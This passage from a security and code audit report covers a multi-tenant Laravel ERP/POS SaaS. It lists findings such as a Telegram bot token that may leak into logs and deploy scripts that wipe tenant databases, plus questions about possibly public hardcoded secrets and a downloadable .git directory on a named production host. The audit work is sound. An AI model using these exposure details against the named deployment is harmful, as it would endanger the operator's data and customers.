- **Recommendation:** git rm --cached backend/public/hot and ignore /backend/public/hot. Also rm -f public/hot in the deploy step.

### 59. [MEDIUM] Download endpoint falls back to hardcoded coffee/2m file paths outside storage, including the repo root and desktop/dist
- **Location:** `backend/app/Actions/AppVersions/DownloadLatestApkAction.php:27`
- **Effort:** S
- **Evidence:** When no active row or file exists, the code serves public_path('sroor-cofe-erp-2m.apk'), base_path('../sroor-cofe-erp-2m.apk'), base_path('../mobile/sroor-coffee-erp-v1.0.apk') and base_path('../desktop/dist/Sroor-ERP-POS-Setup-1.0.0.exe'). The route /api/v1/app/download-apk is public and unauthenticated; that is acceptable. There is no unique index on (platform, version_code) in the 2026_08_22_000001 migration.
- **Impact:** Clients may get a stale debug binary for the wrong tenant that does not match any app_versions row (no checksum). This hides publishing mistakes.
- **Recommendation:** Remove the fallbacks and return 404 when no published artifact exists. Add unique(platform, version_code). Return checksum and download_url in the check-update response; it already computes 'checksum' but the controller drops it.

### 60. [LOW] Dead Livewire-era and root-layout scripts that no longer work on this branch
- **Location:** `D:/projects/sroor/test_val.php:7`
- **Effort:** S
- **Evidence:** test_val.php:7 uses App\Livewire\Auth\UserManager, but backend/app/Livewire no longer exists. test_livewire_real.py, test_pnl_livewire.py, test_render_component.py and test_render_component2.py target Livewire on prod. clean_e2e.php, fix_local_admin.php and test_val.php require __DIR__.'/vendor/autoload.php', and there is no root vendor/ or composer.json (the app is in backend/). test_clean.py, debug_exact_user_save.py and run_all_tests.py:77 run `php artisan` from the root, where no artisan exists. deploy_hostinger_php83.py and deploy_hostinger_php84.py duplicate each other for different dirs. .github/workflows/deploy.yml:30-38 runs composer update and artisan test at the repo root, which has no composer.json, so the CI test job cannot succeed as written.
- **Impact:** Noise, plus false confidence: the CI gate and the local e2e runner cannot actually run against the current layout.
- **Recommendation:** Delete them. Point CI at working-directory: backend, use composer install (not update), and add a Vite build step and a Playwright step.

### 61. [LOW] Provisioning pipeline is untested: tests fake TenantCreated
- **Location:** `backend/tests/Feature/SuperAdminSolidTest.php:32`
- **Effort:** M
- **Evidence:** setUp fakes \Stancl\Tenancy\Events\TenantCreated, so CreateDatabase, MigrateDatabase and TenantProvisionerService::provision seeding are never exercised. There are no tests for runTenantMigrations, destroyTenant or update-db-config. The parse errors above went unnoticed as a result.
- **Impact:** Regressions in the single most important SaaS flow (signing up a customer) ship undetected.
- **Recommendation:** Add a Feature test using the sqlite manager (suffix .sqlite) that provisions a tenant end-to-end, asserts the tenant DB has tables, admin role and main store, and asserts that a second tenant cannot see the first one's data or cache. Add a CI php -l/PHPStan gate.

### 62. [LOW] Queue worker runs every minute but nothing is queued; DB queue connection is not pinned to central
- **Location:** `backend/routes/console.php:12`
- **Effort:** S
- **Evidence:** queue:work --stop-when-empty runs everyMinute(), yet grep finds no dispatch() of any Job in app/. The four Job classes (SendTelegramDatabaseBackupJob, SendDailySummaryReportJob, CheckOverdueShiftsJob, CheckLowStockAlertJob) are unused. config/queue.php:40 has 'connection' => env('DB_QUEUE_CONNECTION') = null → default connection. Tenant migrations also create jobs/failed_jobs tables (database/migrations/tenant/0001_01_01_000002_create_jobs_table.php).
- **Impact:** The worker uses cron and CPU for nothing. Telegram I/O runs synchronously inside requests. Once jobs are dispatched from tenant context, they may land in the tenant DB's jobs table, which the central worker never reads.
- **Recommendation:** Pin DB_QUEUE_CONNECTION to central, dispatch Telegram and backup work as tenant-aware queued jobs (QueueTenancyBootstrapper is already enabled), and alert on failed_jobs growth.

### 63. [LOW] Telegram error messages may log the bot token
- **Location:** `backend/app/Services/TelegramService.php:353`
- **Effort:** S
- **Evidence:** The request URL embeds the token ("https://api.telegram.org/bot{$token}/sendDocument", line 334). On exception, $e->getMessage() is logged (line 354) and returned in the result message (line 362). For cURL/connection errors, Laravel's HTTP client messages typically include the full URL.
- **Impact:** The bot token can leak into laravel.log, Telescope exception entries and UI/CLI output. Whoever has it can read the backup chat history, including the DB dumps.
- **Recommendation:** Redact the token from exception messages before logging or returning them. Rotate the bot token after cleanup.

### 64. [LOW] Test/E2E environment diverges from prod (sqlite vs MySQL); a tracked .env.e2e holds an APP_KEY
- **Location:** `backend/phpunit.xml`
- **Effort:** M
- **Evidence:** phpunit.xml sets DB_CONNECTION=sqlite and DB_DATABASE=:memory:. .env.e2e (tracked) uses sqlite database/e2e_testing.sqlite, APP_DEBUG=true and an APP_KEY (test value). Prod is MySQL with DB-per-tenant. lockForUpdate is a no-op and DECIMAL semantics differ on sqlite. The tenancy suffix logic switches to '.sqlite' (tenancy.php:58).
- **Impact:** Concurrency, locking and DECIMAL bugs and real per-tenant DB provisioning are never exercised before prod. The environment gap adds to the missing staging.
- **Recommendation:** Add a CI job running the Feature suite against a MySQL 8 service container with real tenant DB creation and tenants:migrate. Keep sqlite for the fast unit lane. Generate the E2E APP_KEY at runtime instead of committing it.

### 65. [LOW] Dead or broken legacy updater composable
- **Location:** `backend/resources/js/Composables/useAppUpdater.js:22`
- **Effort:** S
- **Evidence:** It calls GET /app/check-version, which is not defined (routes/api.php:23-26 define /app/version and /app/check-update), and hardcodes version 1.0.0/1. It is only used by Components/Common/AppUpdateModal.vue, which nothing imports (App.vue imports Components/AppUpdateModal.vue).
- **Impact:** Confusion and drift. Whoever wires it up gets 404s.
- **Recommendation:** Delete useAppUpdater.js and Components/Common/AppUpdateModal.vue.

### 66. [LOW] Repo-root clutter: 117 py scripts, tracked pyc and screenshots, compiled views, legacy review logs, 'coffee' identifiers
- **Location:** `__pycache__/bump_version.cpython-312.pyc`
- **Effort:** M
- **Evidence:** Tracked: __pycache__/bump_version.cpython-312.pyc, after_submit.png, before_submit.png and modal_failure.png (root), 60 compiled Blade views under root storage/framework/views/*.php, and docs/screenshots (35 files, 6.8MB, possibly intentional). Root .md files include api-migration-log.md, backend-review-log.md, code-review-log.md, e2e-testing-log.md, mobile-review-log.md and project-spec.md. Coffee naming appears in desktop/package.json name 'sroor-cofe-erp-desktop', productName 'سرور كوفي ERP & POS', backend/public/manifest.json id 'sroor-coffee-pos-app', Android appId com.sroor.cofe.erp, the GitHub repo name sroor-cofe-erp, and the CI name 'Deploy Sroor Coffee ERP'. desktop appId is com.baraasolutions.sroorerp (neutral).
- **Impact:** Noise and accidental commits. A buyer reviewing the repo or app sees one customer's branding.
- **Recommendation:** Move the ops scripts to a separate private ops repo (or tools/ops with env-based credentials). git mv the root review logs to docs/reviews/legacy/. Rename the PWA id, product names and Android appId to neutral names before the first public store release.

### 67. [INFO] tenancy:sync-hosts is a Windows dev tool; there is no production domain/subdomain onboarding automation
- **Location:** `backend/app/Console/Commands/SyncTenantsToHostsCommand.php:17`
- **Effort:** S
- **Evidence:** Hardcodes 'C:\Windows\System32\drivers\etc\hosts' and makhzani.test domains, and shells `ipconfig /flushdns`. The provisioner only inserts `{slug}.{CENTRAL_DOMAIN}` and optional custom-domain rows (TenantProvisionerService.php:58-69, reading env() directly at runtime, which returns null under config:cache so it falls back to the hardcoded 'baraa-solutions.com').
- **Impact:** Production subdomains work only if a wildcard DNS/vhost already exists. Custom domains need manual hPanel/SSL work, with no status tracking. Reading env() outside config breaks after config:cache if CENTRAL_DOMAIN differs from the fallback.
- **Recommendation:** Use config('tenancy.central_domain') instead of env(). Document wildcard DNS + wildcard SSL as a prerequisite. Track custom-domain verification status (DNS check plus SSL issuance) on the domains table.

## Open questions
- Are github.com/kamalsroor1/sroor-cofe-erp and github.com/kamalsroor1/erp-hub public or private? If either is public, the SSH, DB and webhook secrets are already public and rotation is an emergency.
- Is tenant '2m' (or 'tenant_sroor') a real paying customer on baraa-solutions.com? If so, has deploy_root_baraa.py already been run against it (it wipes invoices, payments and stock and drops the tenant_sroor DB)?
- Which .htaccess is currently live in sroor.baraa-solutions.com/public_html: the origin/main one that rewrites to public/, or the one deploy.sh/fix_root_index.py wrote that serves existing files? With the latter, the root *.py files, .git/ and backups would be downloadable over HTTPS. This could not be verified without network access, per the read-only rules.
- Has fix_shipping_php83.py or deploy_with_mysql.py, both migrate:fresh against DB [HOSTING_ACCOUNT], ever been run after the sroor DB held real data?
- Is the production admin account still on the default password that the live tests log in with?
- Script classification. (a) Touches production and mutates: deploy_all_locations, deploy_header_version, deploy_hostinger_php83 and _php84, deploy_live_and_seed, deploy_live_safe, deploy_local_to_server, deploy_remote, deploy_root_baraa, deploy_sroor, deploy_subdomain, deploy_to_sroor_subdomain, deploy_with_mysql, finish_subdomain, fix_shipping_php83, fix_htaccess, fix_htaccess_pathinfo, fix_root_index, fix_sub_htaccess, clean_sub_htaccess, fix_server_timezone, pull_and_verify, sync_sroor, test_all_live (writes .htaccess), diagnose_server_view, rebuild_cache, clear_views, publish_windows_version, restore_sroor_db, deploy.sh, deploy.bat, update_webhook.php and cron_schedule.sh. (a) Touches production read-only: about 35 check_* scripts, verify_*, test_info, test_remote, test_live_time, test_live_login, test_pnl, read_webhook, read_deploy_all, run_check, find_*, backup_sroor_db (DB read, but writes dump files on the server), and the HTTP-only live tests test_live_*, test_production_verification, test_all_sroor_routes, test_urls and test_sidebar_click. (b) Local dev helpers: build-apk.bat/.ps1, bump_version.py, start.bat/.ps1, start-desktop.bat, run_all_tests.py, debug_*.py, inspect_login, print_error, print_titles, check_server, test_http_fetch, test_shipping_url, test_single_user, test_pos_customer_and_print, test_reports_and_touch_screens, test_touch_pos_and_mini_sidebar, test_sroor_items, scripts/setup-hosts.bat/.ps1 (edit the Windows hosts file), scripts/capture_*.cjs and tests_e2e/. (c) One-off data fixes on production: fix_duplicate_payments, run_cost_sync, run_reconcile_fifo, update_invoices_total_cost, update_exp_db, seed_fresh_direct and seed_initial_data. (d) Dead or obsolete: test_livewire_real, test_pnl_livewire, test_render_component and test_render_component2, test_val.php, clean_e2e.php, fix_local_admin.php, test_clean.py, the deploy_hostinger_php83/84 duplicates, and the single-tenant deploy_* variants.
- Proposal. DELETE all of (c) after porting, all of (d), the 15 deploy_*.py, deploy.sh, deploy.bat, update_webhook.php (both copies) and sync_sroor.py. MOVE into backend artisan commands that take --tenant and --dry-run and refuse production without confirmation: the cost sync, FIFO reconcile, invoice total_cost recalc, the duplicate-payment fix (as a soft cancel), publish-app-version and DB backup (spatie/laravel-backup or a tenants-aware backup command). MOVE into a gitignored ops/ folder, with credentials from env or ssh-agent only: read-only diagnostics, if they are worth keeping. KEEP in the repo: build-apk.*, bump_version.py, start*.bat/.ps1, scripts/ and tests_e2e/. Replace deploy with a single GitHub Actions job using SSH-key secrets that runs migrate and tenants:migrate.
- Is github.com/kamalsroor1/sroor-cofe-erp public? The deploy scripts clone it over HTTPS with no credentials, which suggests it is. If so, all hardcoded secrets (SSH password, central DB password, APP_KEY, webhook token) are already public and need emergency rotation.
- Are 'tenant_sroor' and '2m' real paying customers or demo tenants? This decides whether deploy_root_baraa.py lines 124 and 129 have already destroyed real data.
- Which script was used for the last production release, and which branch is live on baraa-solutions.com? deploy_root_baraa.py deploys feature/api-migration.
- Has the 'erp-hub' remote ever received the backups/ dumps or the WIP commit?
- Is the Hostinger cron currently pointed at cron_schedule.sh's old path? If so, the scheduler (queue, backups, alerts) may not be running at all.
- Does Hostinger's SSH (port 65002) allow key-only auth and an `ln -sfn` symlink swap for public_html/index.php targets? This decides between symlinked releases and an index.php bridge that points at current/.
- Is tenant '2m' (2m.baraa-solutions.com) a real paying customer or purely a demo? This decides whether the deploy_root_baraa.py populate/truncate step has already destroyed real data.
- Which deploy path is actually live for the SaaS: deploy_root_baraa.py (branch feature/api-migration, baraa-solutions.com), deploy.sh (origin/main), or update_webhook.php? And which cron (cron_schedule.sh points at sroor.baraa-solutions.com)?
- On Hostinger, are tenant DBs pre-created manually in hPanel with per-tenant users (tenancy_db_username/password), or does the central MySQL user have CREATE privilege? That decides whether SafeMySQLDatabaseManager's swallow path is exercised in production.
- Does production use a wildcard DNS record and wildcard SSL for *.baraa-solutions.com, or is each tenant subdomain added manually?
- Has any tenant-context code path dispatched jobs on the database driver yet? If so, the tenant jobs tables may hold unprocessed jobs.
- Is the 'tenant_sroor' DB (deleted on each deploy_root_baraa.py run) the legacy single-tenant Sroor production data?
- Is the production central DB still the legacy single-shop 'sroor' DB that holds invoices/settings tables? If so, the central-only Telegram backup and notify commands are backing up and reporting legacy data, not the tenants.
- Has commit 76f32ce0 (which contains backups/*.sql) been pushed to any remote or fork, or shared? `git branch -r --contains` shows none for erp-hub, but other clones and worktrees under .claude/worktrees should be checked.
- What APP_ENV, APP_DEBUG, LOG_LEVEL and TELESCOPE_ENABLED are actually set on the Hostinger prod .env? This decides whether Telescope records every request.
- Does the Hostinger plan allow CREATE DATABASE from PHP, or are tenant DBs pre-created in hPanel with per-tenant credentials? This affects how a backup job enumerates and authenticates to tenant DBs.
- Is the Telegram backup chat private to the owner, or a group with staff? Does any tenant's staff have access?
- Did any tenant-admin flow let a tenant create a user whose phone matches the hardcoded super-admin phones in AppServiceProvider Gate::before? This needs confirming with the security lead.
- Is backend/android/app/src/main/assets/public/update_webhook.php present in released APKs (sroor-cofe-erp-2m.apk)? If so, the webhook token must be treated as public and rotated now.
- Are the GitHub repos kamalsroor1/sroor-cofe-erp and erp-hub private? This changes the urgency of the pushed SSH-credential exposure, not the need to rotate.
- Which deploy path is live today: deploy.sh (root as the Laravel app), or erp_repo/backend with public_html pointing at backend/public? This decides whether the tracked backend/public/hot is breaking or masking anything in prod.
- Is backend/public/build committed on purpose because Hostinger cannot run npm? If so, untracking it requires CI to build the assets and ship an artifact first.
- Is the APK meant for sideloading only, or for Google Play? This decides whether to use AAB, Play In-App Updates, and whether the com.sroor.cofe.erp package id can still be renamed.
- Proposed .gitignore additions: __pycache__/, *.py[cod], /*.png, /backups/, *.sql, *.sql.gz, /storage/, /backend/public/build/, /backend/public/hot, /backend/public/storage, /backend/public/*.apk, /backend/public/*.exe, /backend/e2e/screenshots/, /backend/e2e/.auth/, /backend/tests/e2e/reports/, **/test-results/, **/playwright-report/, keystore.properties. A cleaner option is a standard Laravel backend/.gitignore.
- Proposed git rm --cached (not executed): __pycache__/bump_version.cpython-312.pyc, after_submit.png, before_submit.png, modal_failure.png, -r storage/ (root compiled views), -r backups/ (better: drop it from the unpushed commit 76f32ce0), backend/public/hot, backend/e2e/.auth/user.json, -r backend/e2e/screenshots, -r backend/tests/e2e/reports, and -r backend/public/build only once CI builds the assets. Optional git filter-repo to purge backend/public/build and the screenshots from history (~350MB) plus the credential scripts.